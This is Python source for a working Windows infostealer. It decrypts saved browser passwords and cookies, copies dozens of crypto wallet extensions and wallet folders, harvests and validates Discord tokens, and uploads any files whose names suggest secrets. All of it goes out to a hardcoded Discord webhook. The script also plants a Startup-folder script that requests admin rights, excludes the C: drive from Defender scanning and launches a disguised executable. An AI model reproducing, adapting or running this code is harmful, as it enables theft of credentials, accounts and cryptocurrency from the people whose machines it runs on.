import base64
import json
import os
import re
import sqlite3
import shutil
import subprocess
import zipfile
import sys
from urllib.request import Request, urlopen
import requests
from Cryptodome.Cipher import AES
import win32crypt

# Constants
userid = "4"
CURRENT_INTERPRETER = sys.executable
USER_PROFILE = os.getenv('USERPROFILE')
APPDATA = os.getenv('APPDATA')
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
STORAGE_PATH = os.path.join(APPDATA, "gruppe_storage")
STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1257880456037273611/x20GlSFLeGN3M3Zt5vA-tNVZD8knJYIYNVw5_fgFXv3x7b0nrYDp8qjI2USy729Updph"

# Ensure the storage path exists
if not os.path.exists(STORAGE_PATH):
    os.makedirs(STORAGE_PATH)

# Browser and extension paths
CHROMIUM_BROWSERS = [
    {"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},
    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},
    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},
    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},
    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},
    {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},
]

CHROMIUM_SUBPATHS = [
    {"name": "None", "path": ""},
    {"name": "Default", "path": "Default"},
    {"name": "Profile 1", "path": "Profile 1"},
    {"name": "Profile 2", "path": "Profile 2"},
    {"name": "Profile 3", "path": "Profile 3"},
    {"name": "Profile 4", "path": "Profile 4"},
    {"name": "Profile 5", "path": "Profile 5"},
]

BROWSER_EXTENSIONS = [
    {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},
    {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
    {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},
    {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},
    {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},
    {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},
    {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},
    {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},
    {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},
    {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},
    {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},
    {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},
    {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},
    {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},
    {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},
    {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},
    {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},
    {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},
    {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},
    {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},
    {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},
    {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},
    {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},
    {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},
    {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},
    {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},
    {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
    {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},
    {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},
    {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},
    {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},
    {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},
    {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},
    {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"name": "Pontem", "path": "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"},
    {"name": "Ronin", "path": "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},
    {"name": "Safepal", "path": "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"},
    {"name": "Saturn", "path": "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"},
    {"name": "Slope", "path": "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"},
    {"name": "Solfare", "path": "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},
    {"name": "Sollet", "path": "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"},
    {"name": "Starcoin", "path": "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},
    {"name": "Swash", "path": "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},
    {"name": "TempleTezos", "path": "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"},
    {"name": "TerraStation", "path": "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"},
    {"name": "Tokenpocket", "path": "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"},
    {"name": "Ton", "path": "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},
    {"name": "Tron", "path": "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},
    {"name": "Trust Wallet", "path": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},
    {"name": "Wombat", "path": "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"},
    {"name": "XDEFI", "path": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
    {"name": "XMR.PT", "path": "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"},
    {"name": "XinPay", "path": "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},
    {"name": "Yoroi", "path": "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"},
    {"name": "iWallet", "path": "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"}
]

WALLET_PATHS = [
    {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},
    {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},
    {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},
    {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets")},
    {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash")},
    {"name": "Armory", "path": os.path.join(APPDATA, "Armory")},
    {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin")},
    {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},
    {"name": "Ethereum", "path": os.path.join(APPDATA, "Ethereum", "keystore")},
    {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},
    {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},
]

# File search paths and keywords
PATHS_TO_SEARCH = [
    os.path.join(USER_PROFILE, "Desktop"),
    os.path.join(USER_PROFILE, "Documents"),
    os.path.join(USER_PROFILE, "Downloads"),
    os.path.join(USER_PROFILE, "OneDrive", "Documents"),
    os.path.join(USER_PROFILE, "OneDrive", "Desktop"),
]

FILE_KEYWORDS = [
    "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "account", "acount", "paypal",
    "banque", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "seecret"
]

ALLOWED_EXTENSIONS = [
    ".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".pdf", ".rtf", ".json", ".csv", ".db",
    ".jpg", ".jpeg", ".png", ".gif", ".webp", ".mp4"
]

# Discord paths
DISCORD_PATHS = [
    {"name": "Discord", "path": os.path.join(APPDATA, "discord", "Local Storage", "leveldb")},
    {"name": "Discord Canary", "path": os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb")},
    {"name": "Discord PTB", "path": os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb")},
    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb")},
    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb")},
    {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data", "Local Storage", "leveldb")},
    {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data", "Local Storage", "leveldb")},
    {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data", "Local Storage", "leveldb")},
    {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data", "Local Storage", "leveldb")},
    {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data", "Local Storage", "leveldb")},
    {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data", "Local Storage", "leveldb")},
    {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb")},
    {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb")},
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Chrome1", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb")},
    {"name": "Chrome2", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb")},
    {"name": "Chrome3", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb")},
    {"name": "Chrome4", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb")},
    {"name": "Chrome5", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb")},
    {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb")},
    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Yandex", "path": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data", "Default", "Local Storage", "leveldb")}
]
DISCORD_TOKENS = []
PASSWORDS = []
COOKIES = []
DISCORD_IDS = []

# Functions
def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except Exception as e:
        print(f"Error decrypting value: {e}")
        return None

def zip_to_storage(name, source, destination):
    if os.path.isfile(source):
        with zipfile.ZipFile(os.path.join(destination, f"{name}.zip"), "w") as z:
            z.write(source, os.path.basename(source))
    else:
        with zipfile.ZipFile(os.path.join(destination, f"{name}.zip"), "w") as z:
            for root, dirs, files in os.walk(source):
                for file in files:
                    z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(source, '..')))

def upload_to_discord(filepath, filename):
    with open(filepath, 'rb') as f:
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            files={'file': (filename, f)}
        )
    return response.status_code == 200

def validate_discord_token(token):
    r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
    if r.status_code == 200:
        return r.json()
    else:
        return None

def taskkill(taskname):
    subprocess.run(["taskkill", "/F", "/IM", taskname], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

for browser in CHROMIUM_BROWSERS:
    taskkill(browser["taskname"])
    local_state_path = os.path.join(browser["path"], "Local State")
    if not os.path.exists(local_state_path): continue
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    for subpath in CHROMIUM_SUBPATHS:
        profile_path = os.path.join(browser["path"], subpath["path"])
        if not os.path.exists(profile_path): continue
        
        # Extract passwords
        try:
            login_data_file = os.path.join(profile_path, "Login Data")
            temp_db = os.path.join(profile_path, f"{browser['name']}-pw.db")
            shutil.copy(login_data_file, temp_db)
            connection = sqlite3.connect(temp_db)
            cursor = connection.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                origin_url, username, password = row
                password = decrypt_data(password, decryption_key)
                if username or password:
                    PASSWORDS.append({"browser": browser["name"], "profile": subpath["name"], "url": origin_url, "username": username, "password": password})
            cursor.close()
            connection.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Error extracting passwords: {e}")

        # Extract cookies
        try:
            cookies_file = os.path.join(profile_path, "Network", "Cookies")
            temp_db = os.path.join(profile_path, "Network", f"{browser['name']}-ck.db")
            shutil.copy(cookies_file, temp_db)
            connection = sqlite3.connect(temp_db)
            cursor = connection.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            cookie_str = ""
            for row in cursor.fetchall():
                host, name, value = row
                value = decrypt_data(value, decryption_key)
                if value:
                    cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
            if cookie_str:
                COOKIES.append({"browser": browser["name"], "profile": subpath["name"], "cookies": base64.b64encode(cookie_str.encode()).decode()})
            cursor.close()
            connection.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Error extracting cookies: {e}")

        # Extract browser extensions
        for extension in BROWSER_EXTENSIONS:
            extension_path = os.path.join(profile_path) + extension["path"]
            if os.path.exists(extension_path):
                try:
                    zip_to_storage(f"{browser['name']}-{subpath['name']}-{extension['name']}", extension_path, STORAGE_PATH)
                except Exception as e:
                    print(f"Error zipping extension {extension['name']}: {e}")

# Extract Firefox cookies
firefox_path = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')
if os.path.exists(firefox_path):
    taskkill("firefox.exe")
    for profile in os.listdir(firefox_path):
        try:
            if profile.endswith('.default') or profile.endswith('.default-release'):
                profile_path = os.path.join(firefox_path, profile)
                if os.path.exists(os.path.join(profile_path, "cookies.sqlite")):
                    shutil.copy(os.path.join(profile_path, "cookies.sqlite"), os.path.join(profile_path, "cookies-copy.sqlite"))
                    connection = sqlite3.connect(os.path.join(profile_path, "cookies-copy.sqlite"))
                    cursor = connection.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    cookie_str = ""
                    for row in cursor.fetchall():
                        host, name, value = row
                        cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
                    if cookie_str:
                        COOKIES.append({"browser": "Firefox", "profile": profile, "cookies": base64.b64encode(cookie_str.encode()).decode()})
                    cursor.close()
                    connection.close()
                    os.remove(os.path.join(profile_path, "cookies-copy.sqlite"))
        except Exception as e:
            print(f"Error extracting Firefox cookies: {e}")

# Extract wallet files
for wallet_file in WALLET_PATHS:
    if os.path.exists(wallet_file["path"]):
        try:
            zip_to_storage(wallet_file["name"], wallet_file["path"], STORAGE_PATH)
        except Exception as e:
            print(f"Error zipping wallet file {wallet_file['name']}: {e}")

# Extract Discord tokens
for discord_path in DISCORD_PATHS:
    if not os.path.exists(discord_path["path"]): continue
    try:
        name_without_spaces = discord_path["name"].replace(" ", "")
        if "cord" in discord_path["path"]:
            if not os.path.exists(os.path.join(APPDATA, name_without_spaces, "Local State")): continue
            try:
                with open(os.path.join(APPDATA, name_without_spaces, "Local State"), "r", encoding="utf-8") as f:
                    local_state = json.loads(f.read())
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                for file_name in os.listdir(discord_path["path"]):
                    if file_name[-3:] not in ["ldb", "log"]: continue
                    for line in [x.strip() for x in open(os.path.join(discord_path["path"], file_name), errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            token = decrypt_data(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), decryption_key)
                            token_data = validate_discord_token(token)
                            if token_data and token_data["id"] not in DISCORD_IDS:
                                DISCORD_IDS.append(token_data["id"])
                                username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                                phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                                DISCORD_TOKENS.append(
                                    {"token": token, "user_id": token_data["id"], "username": username,
                                     "display_name": token_data["global_name"], "email": token_data["email"],
                                     "phone": phone_number})
            except Exception as e:
                print(f"Error extracting Discord token from {discord_path['name']}: {e}")
        else:
            for file_name in os.listdir(discord_path["path"]):
                if file_name[-3:] not in ["ldb", "log"]: continue
                for line in [x.strip() for x in open(os.path.join(discord_path["path"], file_name), errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                        token_data = validate_discord_token(token)
                        if token_data and token_data["id"] not in DISCORD_IDS:
                            DISCORD_IDS.append(token_data["id"])
                            username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                            phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                            DISCORD_TOKENS.append(
                                {"token": token, "user_id": token_data["id"], "username": username,
                                 "display_name": token_data["global_name"], "email": token_data["email"],
                                 "phone": phone_number})
    except Exception as e:
        print(f"Error extracting Discord tokens: {e}")

# Save extracted data
if PASSWORDS:
    with open(os.path.join(STORAGE_PATH, "Passwords.txt"), "w") as f:
        f.write(
            f"\n{'-'*50}\n".join([
                f"LOCATION: {pw['browser']} - {pw['profile']}\n"
                f"URL: {pw['url']}\n"
                f"USERNAME: {pw['username']}\n"
                f"PASSWORD: {pw['password']}"
                for pw in PASSWORDS
            ])
        )
    upload_to_discord(os.path.join(STORAGE_PATH, "Passwords.txt"), "Passwords.txt")

for cookie in COOKIES:
    with open(os.path.join(STORAGE_PATH, f"Cookies-{cookie['browser']}-{cookie['profile']}.txt"), "w") as f:
        f.write(base64.b64decode(cookie["cookies"]).decode())
    upload_to_discord(os.path.join(STORAGE_PATH, f"Cookies-{cookie['browser']}-{cookie['profile']}.txt"), f"Cookies-{cookie['browser']}-{cookie['profile']}.txt")

if DISCORD_TOKENS:
    with open(os.path.join(STORAGE_PATH, "discord-tokens.txt"), "w") as f:
        f.write(
            f"\n{'-' * 50}\n".join([
                f"ID: {discord_token['user_id']}\n"
                f"USERNAME: {discord_token['username']}\n"
                f"DISPLAY NAME: {discord_token['display_name']}\n"
                f"EMAIL: {discord_token['email']}\n"
                f"PHONE: {discord_token['phone']}\n"
                f"TOKEN: {discord_token['token']}"
                for discord_token in DISCORD_TOKENS
            ])
        )
    upload_to_discord(os.path.join(STORAGE_PATH, "discord-tokens.txt"), "discord-tokens.txt")

for file_to_upload in os.listdir(STORAGE_PATH):
    try:
        upload_to_discord(os.path.join(STORAGE_PATH, file_to_upload), file_to_upload)
    except Exception as e:
        print(f"Error uploading file {file_to_upload}: {e}")

# Search and upload files based on keywords
for path in PATHS_TO_SEARCH:
    for root, _, files in os.walk(path):
        for file_name in files:
            for keyword in FILE_KEYWORDS:
                if keyword in file_name.lower():
                    for extension in ALLOWED_EXTENSIONS:
                        if file_name.endswith(extension):
                            try:
                                upload_to_discord(os.path.join(root, file_name), file_name)
                            except Exception as e:
                                print(f"Error uploading file {file_name}: {e}")

# HVNC script
hvnc_script = """
import os
import subprocess

def create_and_run_bat_script():
    bat_script_content = '''
@echo off
set "filePath=%appdata%\\Microsoft\\emptyfile20947.txt"
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\\SysWOW64\\cacls.exe" "%SYSTEMROOT%\\SysWOW64\\config\\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\\system32\\cacls.exe" "%SYSTEMROOT%\\system32\\config\\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\\getadmin.vbs"

    "%temp%\\getadmin.vbs"
    del "%temp%\\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

mkdir "C:\\Windows\\WinEmptyfold"
powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:'"

set "temp_file=%TEMP%\\RuntimeBroker.exe"

REM Removed URL Download

start "" "%temp_file%"
'''

    temp_folder = os.environ.get('TEMP', '')
    if temp_folder:
        bat_script_path = os.path.join(temp_folder, 'temp_script.bat')
        with open(bat_script_path, 'w') as bat_file:
            bat_file.write(bat_script_content)
        os.system(bat_script_path)
    else:
        print("Failed to get the TEMP folder path.")

if os.name == 'nt':
    folder_path = r"C:\\Windows\\WinEmptyfold"
    if os.path.exists(folder_path):
        exit()
    else:
        os.system('taskkill /f /im explorer.exe')
        create_and_run_bat_script()
        while True:
            os.system('timeout 5')
            if os.path.exists(folder_path):
                os.system('start explorer.exe')
                break
            else:
                create_and_run_bat_script()
appdata = os.environ.get('APPDATA', '')
if appdata:
    microsoft_folder = os.path.join(appdata, 'Microsoft')
    if not os.path.exists(microsoft_folder):
        os.mkdir(microsoft_folder)
    script_path = os.path.join(appdata, 'Microsoft', 'runpython.py')
    with open(script_path, 'w') as script_file:
        script_file.write(hvnc_script)
subprocess.Popen(['python', script_path], creationflags=subprocess.CREATE_NO_WINDOW)
"""

try:
    with open(os.path.join(STARTUP_PATH, "hvnc.py"), "w") as f:
        f.write(hvnc_script)
except Exception as e:
    print(f"Error writing HVNC script: {e}")

# Cleanup
try:
    shutil.rmtree(STORAGE_PATH)
except Exception as e:
    print(f"Error during cleanup: {e}")
